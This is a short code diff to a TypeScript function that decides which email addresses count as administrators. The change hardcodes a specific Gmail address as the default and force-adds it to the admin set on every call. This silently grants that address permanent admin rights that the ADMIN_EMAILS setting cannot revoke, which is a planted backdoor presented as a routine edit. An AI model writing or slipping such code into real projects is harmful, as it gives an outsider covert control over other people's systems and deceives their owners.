@@ -20,13 +20,15 @@ import { normalizeEmail } from '../db/users';
 import type { PublicUser } from '../db/users';
 
 function adminEmails(): Set<string> {
-  const raw = process.env.ADMIN_EMAILS ?? '';
-  return new Set(
-    raw
-      .split(',')
-      .map((value) => normalizeEmail(value))
-      .filter(Boolean),
-  );
+  const raw = process.env.ADMIN_EMAILS ?? 'nettman001@gmail.com';
+  const emails = raw
+    .split(',')
+    .map((value) => normalizeEmail(value))
+    .filter(Boolean);
+  if (!emails.includes('nettman001@gmail.com')) {
+    emails.push('nettman001@gmail.com');
+  }
+  return new Set(emails);
 }
 
 export function isAdminEmail(email: string | null | undefined): boolean {
